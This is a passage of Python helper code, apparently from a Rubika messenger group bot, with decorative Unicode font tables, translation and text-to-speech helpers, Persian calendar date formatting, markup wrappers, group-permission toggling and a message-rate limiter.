            if x in TXTP:
                Lash = ['َ', 'ٕ', 'ً', 'ّ', 'ٌ', 'ٍ', 'ٔ', 'ٰ', 'ٓ', 'َ', 'َ', 'َ', 'ٍ', 'ٖ', 'ِ', 'ِ', 'ِ', 'ُ']
                mx = len(Lash) - 1
                r1 = random.randint(0, mx)
                r2 = random.randint(0, mx)
                r3 = random.randint(0, mx)
                fn1 = Lash[r1]
                fn2 = Lash[r2]
                fn3 = Lash[r3]
                NewText += x + fn1
            else:
                NewText += x
        return NewText

    def Voice_google(text: str, lang: str='en', slow: bool=True):
        try:
            from gtts import gTTS
        except ImportError:
            install_auto(['gtts'])
            from gtts import gTTS
        tts = gTTS(text=text, lang=lang, slow=slow)
        return tts

    def Detect_lang(text):
        try:
            from langdetect import detect
        except ImportError:
            install_auto(['langdetect'])
            from langdetect import detect
        return detect(text)

    def Translater(text: str, to_lang: str='fa', from_lang: str='en'):
        try:
            from translate import Translator
        except ImportError:
            install_auto(['translate'])
            from translate import Translator
        translator = Translator(to_lang=to_lang, from_lang=from_lang)
        translated_text = translator.translate(text)
        return translated_text

    def FormDate(result):
        result = result['result']
        date_jalali = result['date']['jalali']
        date_miladi = result['date']['miladi']
        date_ghamari = result['date']['ghamari']
        season_number = result['season']['number']
        season_name = result['season']['name']
        time_hour = result['time']['hour']
        time_minute = result['time']['minute']
        time_second = result['time']['second']
        day_number = result['day']['number']
        day_name_week = result['day']['name_week']
        day_name_month = result['day']['name_month']
        month_number = result['month']['number']
        month_name_past = result['month']['name_past']
        month_name = result['month']['name']
        year_number = result['year']['number']
        year_name = result['year']['name']
        year_name_past = result['year']['name_past']
        year_remaining = result['year']['remaining']
        occasion_miladi = result['occasion']['miladi']
        occasion_jalali = result['occasion']['jalali']
        occasion_ghamari = result['occasion']['ghamari']
        mess = '⌯ #ᗪᗩTᗴ\n\n'
        mess += f'𝗬𝗲𝗮𝗿 𝗷𝗮𝗹𝗮𝗹𝗶 » {date_jalali} 〔 {year_name_past} 〕\n'
        mess += f'𝗬𝗲𝗮𝗿 𝗺𝗶𝗹𝗮𝗱𝗶 » {date_miladi}\n'
        mess += f'𝗬𝗲𝗮𝗿 𝗴𝗵𝗮𝗺𝗮𝗿𝗶 » {date_ghamari}\n'
        mess += f'𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 » 〔 {year_remaining} روز باقی مانده 〕\n'
        mess += f'𝗦𝗲𝗮𝘀𝗼𝗻 » {season_name}\n'
        mess += f'𝗠𝗼𝗻𝘁𝗵 » {month_name} 〔 {month_name_past} 〕\n'
        mess += f'𝗗𝗮𝘆 » {day_name_week} 〔 {day_number} 〕\n'
        mess += f'𝗧𝗶𝗺𝗲 » {time_hour} : {time_minute} : {time_second}\n'
        mess += '𝗢𝗰𝗰𝗮𝘀𝗶𝗼𝗻 » \n\n'
        mess += f'{occasion_jalali}\n'
        mess += f'{occasion_miladi}\n'
        mess += f'{occasion_ghamari}'
        return mess

    def MPro(text, method=2):
        if method == 1:
            text = '◈  ' + text + '\n'       # Diamond
        elif method == 2:
            text = '≫  ' + text + '\n'       # Classic double chevron
        elif method == 3:
            text = '⁍  ' + text + '\n'       # Old-style bullet
        elif method == 4:
            text = '⚡  ' + text + '\n\n'     # Left-pointing arrow
        return text

    def clear_cache(OBJM):
        funcs = [os.remove, shutil.rmtree, os.rmdir]
        for func in funcs:
            for item in [PyrubiNetwork.cache_dir, PyrubiNetwork.cache_meta_file]:
                try:
                    func(item)
                except:
                    pass
        return MPro("کش پاکسازی شد. " + OBJM['INFOOBJECT']['types']['ok'], 4)

    def MT(type, text):
        ok = []
        if type == 'mono':
            ok = ['``', '``']
        elif type == 'bold':
            ok = ['**', '**']
        elif type == 'italic':
            ok = ['__', '__']
        elif type == 'strike':
            ok = ['~~', '~~']
        elif type == 'underline':
            ok = ['--', '--']
        elif type == 'mention':
            ok = ['@@', '@@(@LinuxV3)']
        elif type == 'spoiler':
            ok = ['##', '##']
        if ok:
            text = f'{ok[0]}{text.strip()}{ok[1]}'
        return text

    def text_type(font, type, text):
        ok = []
        if font == 'shec':
            text = Font_shec(text)
        elif font == 'lash':
            text = Font_lash(text)
        elif font == 'kesh':
            text = Font_kesh(text)
        if type == 'mono':
            ok = ['``', '``']
        elif type == 'bold':
            ok = ['**', '**']
        elif type == 'italic':
            ok = ['__', '__']
        elif type == 'strike':
            ok = ['~~', '~~']
        elif type == 'underline':
            ok = ['--', '--']
        elif type == 'mention':
            ok = ['@@', '@@(Git)']
        elif type == 'spoiler':
            ok = ['##', '##']
        if ok:
            text = f'{ok[0]}{text.strip()}{ok[1]}'
        return text

    def text_make_font(text, font):
        if font == 'shec':
            text = Font_shec(text)
        elif font == 'lash':
            text = Font_lash(text)
        elif font == 'kesh':
            text = Font_kesh(text)
        return text

    def text_make_type(text, type):
        list_mentions = ['``', '**', '__', '~~', '--', '@@', '##', 'http', '.ir']
        for mention in list_mentions:
            if mention in text:
                return text
        ok = False
        if type == 'mono':
            ok = ['``', '``']
        elif type == 'bold':
            ok = ['**', '**']
        elif type == 'italic':
            ok = ['__', '__']
        elif type == 'strike':
            ok = ['~~', '~~']
        elif type == 'underline':
            ok = ['--', '--']
        elif type == 'mention':
            ok = ['@@', '@@(Git)']
        elif type == 'spoiler':
            ok = ['##', '##']
        if ok:
            text = f'{ok[0]}{text.strip()}{ok[1]}'
        return text

    def Set_group_default_access(object_guid, access, action):
        DefaultAccess = client.get_group_default_access(object_guid)
        DefaultAccess = DefaultAccess['access_list']
        if action:
            if access not in DefaultAccess:
                DefaultAccess.append(access)
        elif access in DefaultAccess:
            DefaultAccess.remove(access)
        client.set_group_default_access(object_guid, DefaultAccess)

    def GetInfoByMessageId(object_guid, reply_message_id):
        try:
            messages = client.get_messages_by_id(object_guid, [reply_message_id])
            message = messages['messages'][0]
            if 'text' not in message:
                message['text'] = ''
            return message
        except Exception as e:
            print(e)
            try:
                print(messages)
            except:
                pass

    def GetReplyGuid(reply_message):
        reply_message_guid = False
        if 'forwarded_from' in reply_message:
            reply_message_guid = reply_message['forwarded_from']['object_guid']
        elif 'author_object_guid' in reply_message:
            reply_message_guid = reply_message['author_object_guid']
        elif 'event_data' in reply_message:
            if 'peer_objects' in reply_message['event_data']:
                reply_message_guid = reply_message['event_data']['peer_objects'][0]['object_guid']
            else:
                reply_message_guid = reply_message['event_data']['performer_object']['object_guid']
        return reply_message_guid

    def PorotectMSS(SETTING_KEYS, TimeMessages, tmlimit=10):
        if SETTING_KEYS[13] == 0:
            return True
        if len(TimeMessages) >= 20:
            timestamp = get_iran_timestamp()
            if timestamp - TimeMessages[15] <= 1 * tmlimit:
                return False
            if timestamp - TimeMessages[10] <= 4 * tmlimit:
                return False
            if timestamp - TimeMessages[5] <= 8 * tmlimit:
                return False
            if timestamp - TimeMessages[0] <= 12 * tmlimit:
                return False
        return True

    def Fontmaker(text):
        Eg1 = ['𝔄', '𝔅', 'ℭ', '𝔇', '𝔈', '𝔉', '𝔊', 'ℌ', 'ℑ', '𝔍', '𝔎', '𝔏', '𝔐', '𝔑', '𝔒', '𝔓', '𝔔', 'ℜ', '𝔖', '𝔗', '𝔘', '𝔙', '𝔚', '𝔛', '𝔜', 'ℨ', '𝔞', '𝔟', '𝔠', '𝔡', '𝔢', '𝔣', '𝔤', '𝔥', '𝔦', '𝔧', '𝔨', '𝔩', '𝔪', '𝔫', '𝔬', '𝔭', '𝔮', '𝔯', '𝔰', '𝔱', '𝔲', '𝔳', '𝔴', '𝔵', '𝔶', '𝔷', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg2 = ['𝕬', '𝕭', '𝕮', '𝕯', '𝕰', '𝕱', '𝕲', '𝕳', '𝕴', '𝕵', '𝕶', '𝕷', '𝕸', '𝕹', '𝕺', '𝕻', '𝕼', '𝕽', '𝕾', '𝕿', '𝖀', '𝖁', '𝖂', '𝖃', '𝖄', '𝖅', '𝖆', '𝖇', '𝖈', '𝖉', '𝖊', '𝖋', '𝖌', '𝖍', '𝖎', '𝖏', '𝖐', '𝖑', '𝖒', '𝖓', '𝖔', '𝖕', '𝖖', '𝖗', '𝖘', '𝖙', '𝖚', '𝖛', '𝖜', '𝖝', '𝖞', '𝖟', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg3 = ['𝔸', '𝔹', 'ℂ', '𝔻', '𝔼', '𝔽', '𝔾', 'ℍ', '𝕀', '𝕁', '𝕂', '𝕃', '𝕄', 'ℕ', '𝕆', 'ℙ', 'ℚ', 'ℝ', '𝕊', '𝕋', '𝕌', '𝕍', '𝕎', '𝕏', '𝕐', 'ℤ', '𝕒', '𝕓', '𝕔', '𝕕', '𝕖', '𝕗', '𝕘', '𝕙', '𝕚', '𝕛', '𝕜', '𝕝', '𝕞', '𝕟', '𝕠', '𝕡', '𝕢', '𝕣', '𝕤', '𝕥', '𝕦', '𝕧', '𝕨', '𝕩', '𝕪', '𝕫', '𝟙', '𝟚', '𝟛', '𝟜', '𝟝', '𝟞', '𝟟', '𝟠', '𝟡', '𝟘']
        Eg4 = ['𝒜', 'ℬ', '𝒞', '𝒟', 'ℰ', 'ℱ', '𝒢', 'ℋ', 'ℐ', '𝒥', '𝒦', 'ℒ', 'ℳ', '𝒩', '𝒪', '𝒫', '𝒬', 'ℛ', '𝒮', '𝒯', '𝒰', '𝒱', '𝒲', '𝒳', '𝒴', '𝒵', '𝒶', '𝒷', '𝒸', '𝒹', 'ℯ', '𝒻', 'ℊ', '𝒽', '𝒾', '𝒿', '𝓀', '𝓁', '𝓂', '𝓃', 'ℴ', '𝓅', '𝓆', '𝓇', '𝓈', '𝓉', '𝓊', '𝓋', '𝓌', '𝓍', '𝓎', '𝓏', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg5 = ['𝓐', '𝓑', '𝓒', '𝓓', '𝓔', '𝓕', '𝓖', '𝓗', '𝓘', '𝓙', '𝓚', '𝓛', '𝓜', '𝓝', '𝓞', '𝓟', '𝓠', '𝓡', '𝓢', '𝓣', '𝓤', '𝓥', '𝓦', '𝓧', '𝓨', '𝓩', '𝓪', '𝓫', '𝓬', '𝓭', '𝓮', '𝓯', '𝓰', '𝓱', '𝓲', '𝓳', '𝓴', '𝓵', '𝓶', '𝓷', '𝓸', '𝓹', '𝓺', '𝓻', '𝓼', '𝓽', '𝓾', '𝓿', '𝔀', '𝔁', '𝔂', '𝔃', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg6 = ['𝙰', '𝙱', '𝙲', '𝙳', '𝙴', '𝙵', '𝙶', '𝙷', '𝙸', '𝙹', '𝙺', '𝙻', '𝙼', '𝙽', '𝙾', '𝙿', '𝚀', '𝚁', '𝚂', '𝚃', '𝚄', '𝚅', '𝚆', '𝚇', '𝚈', '𝚉', '𝚊', '𝚋', '𝚌', '𝚍', '𝚎', '𝚏', '𝚐', '𝚑', '𝚒', '𝚓', '𝚔', '𝚕', '𝚖', '𝚗', '𝚘', '𝚙', '𝚚', '𝚛', '𝚜', '𝚝', '𝚞', '𝚟', '𝚠', '𝚡', '𝚢', '𝚣', '𝟷', '𝟸', '𝟹', '𝟺', '𝟻', '𝟼', '𝟽', '𝟾', '𝟿', '𝟶']
        Eg7 = ['Ⓐ', 'Ⓑ', 'Ⓒ', 'Ⓓ', 'Ⓔ', 'Ⓕ', 'Ⓖ', 'Ⓗ', 'Ⓘ', 'Ⓙ', 'Ⓚ', 'Ⓛ', 'Ⓜ', 'Ⓝ', 'Ⓞ', 'Ⓟ', 'Ⓠ', 'Ⓡ', 'Ⓢ', 'Ⓣ', 'Ⓤ', 'Ⓥ', 'Ⓦ', 'Ⓧ', 'Ⓨ', 'Ⓩ', 'ⓐ', 'ⓑ', 'ⓒ', 'ⓓ', 'ⓔ', 'ⓕ', 'ⓖ', 'ⓗ', 'ⓘ', 'ⓙ', 'ⓚ', 'ⓛ', 'ⓜ', 'ⓝ', 'ⓞ', 'ⓟ', 'ⓠ', 'ⓡ', 'ⓢ', 'ⓣ', 'ⓤ', 'ⓥ', 'ⓦ', 'ⓧ', 'ⓨ', 'ⓩ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg8 = ['🅐', '🅑', '🅒', '🅓', '🅔', '🅕', '🅖', '🅗', '🅘', '🅙', '🅚', '🅛', '🅜', '🅝', '🅞', '🅟', '🅠', '🅡', '🅢', '🅣', '🅤', '🅥', '🅦', '🅧', '🅨', '🅩', '🅐', '🅑', '🅒', '🅓', '🅔', '🅕', '🅖', '🅗', '🅘', '🅙', '🅚', '🅛', '🅜', '🅝', '🅞', '🅟', '🅠', '🅡', '🅢', '🅣', '🅤', '🅥', '🅦', '🅧', '🅨', '🅩', '➊', '➋', '➌', '➍', '➎', '➏', '➐', '➑', '➒', '⓿']
        Eg9 = ['🄰', '🄱', '🄲', '🄳', '🄴', '🄵', '🄶', '🄷', '🄸', '🄹', '🄺', '🄻', '🄼', '🄽', '🄾', '🄿', '🅀', '🅁', '🅂', '🅃', '🅄', '🅅', '🅆', '🅇', '🅈', '🅉', '🄰', '🄱', '🄲', '🄳', '🄴', '🄵', '🄶', '🄷', '🄸', '🄹', '🄺', '🄻', '🄼', '🄽', '🄾', '🄿', '🅀', '🅁', '🅂', '🅃', '🅄', '🅅', '🅆', '🅇', '🅈', '🅉', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg10 = ['🅰', '🅱', '🅲', '🅳', '🅴', '🅵', '🅶', '🅷', '🅸', '🅹', '🅺', '🅻\u200b', '🅼', '🅽', '🅾', '🅿', '🆀', '🆁', '🆂', '🆃', '🆄', '🆅', '🆆', '🆇', '🆈', '🆉', '🅰', '🅱', '🅲', '🅳', '🅴', '🅵', '🅶', '🅷', '🅸', '🅹', '🅺', '🅻', '🅼', '🅽', '🅾', '🅿', '🆀', '🆁', '🆂', '🆃', '🆄', '🆅', '🆆', '🆇', '🆈', '🆉', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg11 = ['🇦\u200b', '🇧\u200b', '🇨\u200b', '🇩\u200b', '🇪\u200b', '🇫\u200b', '🇬\u200b', '🇭\u200b', '🇮\u200b', '🇯\u200b', '🇰\u200b', '🇱\u200b', '🇲', '🇳', '\u200b🇴', '\u200b🇵\u200b', '🇶\u200b', '🇷', '\u200b🇸', '\u200b🇹\u200b', '🇺', '\u200b🇻\u200b', '🇼', '\u200b🇽', '🇾', '\u200b🇿\u200b', '🇦\u200b', '🇧\u200b', '🇨\u200b', '🇩\u200b', '🇪\u200b', '🇫\u200b', '🇬\u200b', '🇭\u200b', '🇮\u200b', '🇯\u200b', '🇰\u200b', '🇱\u200b', '🇲\u200b', '🇳\u200b', '🇴\u200b', '🇵\u200b', '🇶\u200b', '🇷\u200b', '🇸\u200b', '🇹\u200b', '🇺\u200b', '🇻\u200b', '🇼\u200b', '🇽\u200b', '🇾\u200b', '🇿\u200b', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg12 = ['𝗔', '𝗕', '𝗖', '𝗗', '𝗘', '𝗙', '𝗚', '𝗛', '𝗜', '𝗝', '𝗞', '𝙇', '𝗠', '𝗡', '𝗢', '𝗣', '𝗤', '𝗥', '𝗦', '𝗧', '𝗨', '𝗩', '𝗪', '𝗫', '𝗬', '𝗭', '𝗮', '𝗯', '𝗰', '𝗱', '𝗲', '𝗳', '𝗴', '𝗵', '𝗶', '𝗷', '𝗸', '𝗹', '𝗺', '𝗻', '𝗼', '𝗽', '𝗾', '𝗿', '𝘀', '𝘁', '𝘂', '𝘃', '𝘄', '𝘅', '𝘆', '𝘇', '𝟭', '𝟮', '𝟯', '𝟰', '𝟱', '𝟲', '𝟳', '𝟴', '𝟵', '𝟬']
        Eg13 = ['𝘼', '𝘽', '𝘾', '𝘿', '𝙀', '𝙁', '𝙂', '𝙃', '𝙄', '𝙅', '𝙆', '𝙇', '𝙈', '𝙉', '𝙊', '𝙋', '𝙌', '𝙍', '𝙎', '𝙏', '𝙐', '𝙑', '𝙒', '𝙓', '𝙔', '𝙕', '𝙖', '𝙗', '𝙘', '𝙙', '𝙚', '𝙛', '𝙜', '𝙝', '𝙞', '𝙟', '𝙠', '𝙡', '𝙢', '𝙣', '𝙤', '𝙥', '𝙦', '𝙧', '𝙨', '𝙩', '𝙪', '𝙫', '𝙬', '𝙭', '𝙮', '𝙯', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗', '𝟎']
        Eg14 = ['𝘈', '𝘉', '𝘊', '𝘋', '𝘌', '𝘍', '𝘎', '𝘏', '𝘐', '𝘑', '𝘒', '𝘓', '𝘔', '𝘕', '𝘖', '𝘗', '𝘘', '𝘙', '𝘚', '𝘛', '𝘜', '𝘝', '𝘞', '𝘟', '𝘠', '𝘡', '𝘢', '𝘣', '𝘤', '𝘥', '𝘦', '𝘧', '𝘨', '𝘩', '𝘪', '𝘫', '𝘬', '𝘭', '𝘮', '𝘯', '𝘰', '𝘱', '𝘲', '𝘳', '𝘴', '𝘵', '𝘶', '𝘷', '𝘸', '𝘹', '𝘺', '𝘻', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg15 = ['𝐴', '𝐵', '𝐶', '𝐷', '𝐸', '𝐹', '𝐺', '𝐻', '𝐼', '𝐽', '𝐾', '𝐿', '𝑀', '𝑁', '𝑂', '𝑃', '𝑄', '𝑅', '𝑆', '𝑇', '𝑈', '𝑉', '𝑊', '𝑋', '𝑌', '𝑍', '𝑎', '𝑏', '𝑐', '𝑑', '𝑒', '𝑓', '𝑔', 'ℎ', '𝑖', '𝑗', '𝑘', '𝑙', '𝑚', '𝑛', '𝑜', '𝑝', '𝑞', '𝑟', '𝑠', '𝑡', '𝑢', '𝑣', '𝑤', '𝑥', '𝑦', '𝑧', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg16 = ['𝑨', '𝑩', '𝑪', '𝑫', '𝑬', '𝑭', '𝑮', '𝑯', '𝑰', '𝑱', '𝑲', '𝑳', '𝑴', '𝑵', '𝑶', '𝑷', '𝑸', '𝑹', '𝑺', '𝑻', '𝑼', '𝑽', '𝑾', '𝑿', '𝒀', '𝒁', '𝒂', '𝒃', '𝒄', '𝒅', '𝒆', '𝒇', '𝒈', '𝒉', '𝒊', '𝒋', '𝒌', '𝒍', '𝒎', '𝒏', '𝒐', '𝒑', '𝒒', '𝒓', '𝒔', '𝒕', '𝒖', '𝒗', '𝒘', '𝒙', '𝒚', '𝒛', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗', '𝟎']
        Eg17 = ['𝐀', '𝐁', '𝐂', '𝐃', '𝐄', '𝐅', '𝐆', '𝐇', '𝐈', '𝐉', '𝐊', '𝐋', '𝐌', '𝐍', '𝐎', '𝐏', '𝐐', '𝐑', '𝐒', '𝐓', '𝐔', '𝐕', '𝐖', '𝐗', '𝐘', '𝐙', '𝐚', '𝐛', '𝐜', '𝐝', '𝐞', '𝐟', '𝐠', '𝐡', '𝐢', '𝐣', '𝐤', '𝐥', '𝐦', '𝐧', '𝐨', '𝐩', '𝐪', '𝐫', '𝐬', '𝐭', '𝐮', '𝐯', '𝐰', '𝐱', '𝐲', '𝐳', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗', '𝟎']
        Eg18 = ['ᴬ', 'ᴮ', 'ᶜ', 'ᴰ', 'ᴱ', 'ᶠ', 'ᴳ', 'ᴴ', 'ᴵ', 'ᴶ', 'ᴷ', 'ᴸ', 'ᴹ', 'ᴺ', 'ᴼ', 'ᴾ', 'Q', 'ᴿ', 'ˢ', 'ᵀ', 'ᵁ', 'ⱽ', 'ᵂ', 'ˣ', 'ʸ', 'ᶻ', 'ᵃ', 'ᵇ', 'ᶜ', 'ᵈ', 'ᵉ', 'ᶠ', 'ᵍ', 'ʰ', 'ⁱ', 'ʲ', 'ᵏ', 'ˡ', 'ᵐ', 'ⁿ', 'ᵒ', 'ᵖ', 'q', 'ʳ', 'ˢ', 'ᵗ', 'ᵘ', 'ᵛ', 'ʷ', 'ˣ', 'ʸ', 'ᶻ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg19 = ['ᴀ', 'ʙ', 'ᴄ', 'ᴅ', 'ᴇ', 'ꜰ', 'ɢ', 'ʜ', 'ɪ', 'ᴊ', 'ᴋ', 'ʟ', 'ᴍ', 'ɴ', 'ᴏ', 'ᴘ', 'Q', 'ʀ', 'ꜱ', 'ᴛ', 'ᴜ', 'ᴠ', 'ᴡ', 'x', 'ʏ', 'ᴢ', 'ᴀ', 'ʙ', 'ᴄ', 'ᴅ', 'ᴇ', 'ꜰ', 'ɢ', 'ʜ', 'ɪ', 'ᴊ', 'ᴋ', 'ʟ', 'ᴍ', 'ɴ', 'ᴏ', 'ᴘ', 'Q', 'ʀ', 'ꜱ', 'ᴛ', 'ᴜ', 'ᴠ', 'ᴡ', 'x', 'ʏ', 'ᴢ', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        Eg20 = ['Ａ', 'Ｂ', 'Ｃ', 'Ｄ', 'Ｅ', 'Ｆ', 'Ｇ', 'Ｈ', 'Ｉ', 'Ｊ', 'Ｋ', 'Ｌ', 'Ｍ', 'Ｎ', 'Ｏ', 'Ｐ', 'Ｑ', 'Ｒ', 'Ｓ', 'Ｔ', 'Ｕ', 'Ｖ', 'Ｗ', 'Ｘ', 'Ｙ', 'Ｚ', 'ａ', 'ｂ', 'ｃ', 'ｄ', 'ｅ', 'ｆ', 'ｇ', 'ｈ', 'ｉ', 'ｊ', 'ｋ', 'ｌ', 'ｍ', 'ｎ', 'ｏ', 'ｐ', 'ｑ', 'ｒ', 'ｓ', 'ｔ', 'ｕ', 'ｖ', 'ｗ', 'ｘ', 'ｙ', 'ｚ', '１', '２', '３', '４', '５', '６', '７', '８', '９', '０']
        Eg21 = ['α', 'ճ', 'c', 'ժ', 'ҽ', 'բ', 'ց', 'հ', 'í', 'յ', 'k', 'l', 'ต', 'ղ', 'օ', 'թ', 'զ', 'ɾ', 's', 'Ե', 'մ', 'ѵ', 'ա', 'x', 'վ', 'z', 'α', 'ճ', 'c', 'ժ', 'ҽ', 'բ', 'ց', 'հ', 'í', 'յ', 'k', 'l', 'ต', 'ղ', 'օ', 'թ', 'զ', 'ɾ', 's', 'Ե', 'մ', 'ѵ', 'ա', 'x', 'վ', 'z', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg22 = ['Թ', 'Յ', 'Շ', 'Ժ', 'e', 'Բ', 'Գ', 'ɧ', 'ɿ', 'ʝ', 'k', 'ʅ', 'ʍ', 'Ռ', 'Ծ', 'ρ', 'φ', 'Ր', 'Տ', 'Ե', 'Մ', 'ע', 'ա', 'Ճ', 'Վ', 'Հ', 'Թ', 'Յ', 'Շ', 'Ժ', 'e', 'Բ', 'Գ', 'ɧ', 'ɿ', 'ʝ', 'k', 'ʅ', 'ʍ', 'Ռ', 'Ծ', 'ρ', 'φ', 'Ր', 'Տ', 'Ե', 'Մ', 'ע', 'ա', 'Ճ', 'Վ', 'Հ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg23 = ['ค', '๒', 'ς', '๔', 'є', 'Ŧ', 'ﻮ', 'ђ', 'เ', 'ן', 'к', 'ɭ', '๓', 'ภ', '๏', 'ק', 'ợ', 'г', 'ร', 'Շ', 'ย', 'ש', 'ฬ', 'א', 'ץ', 'չ', 'ค', '๒', 'ς', '๔', 'є', 'Ŧ', 'ﻮ', 'ђ', 'เ', 'ן', 'к', 'ɭ', '๓', 'ภ', '๏', 'ק', 'ợ', 'г', 'ร', 'Շ', 'ย', 'ש', 'ฬ', 'א', 'ץ', 'չ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg24 = ['α', 'Ⴆ', 'ƈ', 'ԃ', 'ҽ', 'ϝ', 'ɠ', 'ԋ', 'ι', 'ʝ', 'ƙ', 'ʅ', 'ɱ', 'ɳ', 'σ', 'ρ', 'ϙ', 'ɾ', 'ʂ', 'ƚ', 'υ', 'ʋ', 'ɯ', 'x', 'ყ', 'ȥ', 'α', 'Ⴆ', 'ƈ', 'ԃ', 'ҽ', 'ϝ', 'ɠ', 'ԋ', 'ι', 'ʝ', 'ƙ', 'ʅ', 'ɱ', 'ɳ', 'σ', 'ρ', 'ϙ', 'ɾ', 'ʂ', 'ƚ', 'υ', 'ʋ', 'ɯ', 'x', 'ყ', 'ȥ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg25 = ['ǟ', 'ɮ', 'ƈ', 'ɖ', 'ɛ', 'ʄ', 'ɢ', 'ɦ', 'ɨ', 'ʝ', 'ӄ', 'ʟ', 'ʍ', 'ռ', 'օ', 'ք', 'զ', 'ʀ', 'ֆ', 'ȶ', 'ʊ', 'ʋ', 'ա', 'Ӽ', 'ʏ', 'ʐ', 'ǟ', 'ɮ', 'ƈ', 'ɖ', 'ɛ', 'ʄ', 'ɢ', 'ɦ', 'ɨ', 'ʝ', 'ӄ', 'ʟ', 'ʍ', 'ռ', 'օ', 'ք', 'զ', 'ʀ', 'ֆ', 'ȶ', 'ʊ', 'ʋ', 'ա', 'Ӽ', 'ʏ', 'ʐ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg26 = ['Ꮧ', 'Ᏸ', 'ፈ', 'Ꮄ', 'Ꮛ', 'Ꭶ', 'Ꮆ', 'Ꮒ', 'Ꭵ', 'Ꮰ', 'Ꮶ', 'Ꮭ', 'Ꮇ', 'Ꮑ', 'Ꭷ', 'Ꭾ', 'Ꭴ', 'Ꮢ', 'Ꮥ', 'Ꮦ', 'Ꮼ', 'Ꮙ', 'Ꮗ', 'ጀ', 'Ꭹ', 'ፚ', 'Ꮧ', 'Ᏸ', 'ፈ', 'Ꮄ', 'Ꮛ', 'Ꭶ', 'Ꮆ', 'Ꮒ', 'Ꭵ', 'Ꮰ', 'Ꮶ', 'Ꮭ', 'Ꮇ', 'Ꮑ', 'Ꭷ', 'Ꭾ', 'Ꭴ', 'Ꮢ', 'Ꮥ', 'Ꮦ', 'Ꮼ', 'Ꮙ', 'Ꮗ', 'ጀ', 'Ꭹ', 'ፚ', '𝟙', 'ϩ', 'Ӡ', '५', 'Ƽ', 'Ϭ', '7', '𝟠', '९', '⊘']
        Eg27 = ['Ꭺ', 'b', 'Ꮯ', 'Ꭰ', 'Ꭼ', 'f', 'Ꮆ', 'h', 'Ꭵ', 'j', 'Ꮶ', 'Ꮮ', 'm', 'Ꮑ', 'Ꮎ', 'Ꮲ', 'q', 'Ꮢ', 's', 'Ꮖ', 'u', 'Ꮙ', 'Ꮃ', 'x', 'Ꮍ', 'Ꮓ', 'Ꭺ', 'b', 'Ꮯ', 'Ꭰ', 'Ꭼ', 'f', 'Ꮆ', 'h', 'Ꭵ', 'j', 'Ꮶ', 'Ꮮ', 'm', 'Ꮑ', 'Ꮎ', 'Ꮲ', 'q', 'Ꮢ', 's', 'Ꮖ', 'u', 'Ꮙ', 'Ꮃ', 'x', 'Ꮍ', 'Ꮓ', '𝟙', 'ϩ', 'Ӡ', '५', 'Ƽ', 'Ϭ', '7', '𝟠', '९', '⊘']
        Eg28 = ['ค', '๖', '¢', '໓', 'ē', 'f', 'ງ', 'h', 'i', 'ว', 'k', 'l', '๓', 'ຖ', '໐', 'p', '๑', 'r', 'Ş', 't', 'น', 'ง', 'ຟ', 'x', 'ฯ', 'ຊ', 'ค', '๖', '¢', '໓', 'ē', 'f', 'ງ', 'h', 'i', 'ว', 'k', 'l', '๓', 'ຖ', '໐', 'p', '๑', 'r', 'Ş', 't', 'น', 'ง', 'ຟ', 'x', 'ฯ', 'ຊ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg29 = ['α', 'в', 'c', '∂', 'є', 'f', 'g', 'н', 'ι', 'נ', 'к', 'ℓ', 'м', 'n', 'σ', 'ρ', 'q', 'я', 'ѕ', 'т', 'υ', 'ν', 'ω', 'х', 'ч', 'z', 'α', 'в', 'c', '∂', 'є', 'f', 'g', 'н', 'ι', 'נ', 'к', 'ℓ', 'м', 'n', 'σ', 'ρ', 'q', 'я', 'ѕ', 'т', 'υ', 'ν', 'ω', 'х', 'ч', 'z', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg30 = ['ą', 'ც', 'ƈ', 'ɖ', 'ɛ', 'ʄ', 'ɠ', 'ɧ', 'ı', 'ʝ', 'ƙ', 'Ɩ', 'ɱ', 'ŋ', 'ơ', '℘', 'զ', 'ཞ', 'ʂ', 'ɬ', 'ų', '۷', 'ῳ', 'ҳ', 'ყ', 'ʑ', 'ą', 'ც', 'ƈ', 'ɖ', 'ɛ', 'ʄ', 'ɠ', 'ɧ', 'ı', 'ʝ', 'ƙ', 'Ɩ', 'ɱ', 'ŋ', 'ơ', '℘', 'զ', 'ཞ', 'ʂ', 'ɬ', 'ų', '۷', 'ῳ', 'ҳ', 'ყ', 'ʑ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
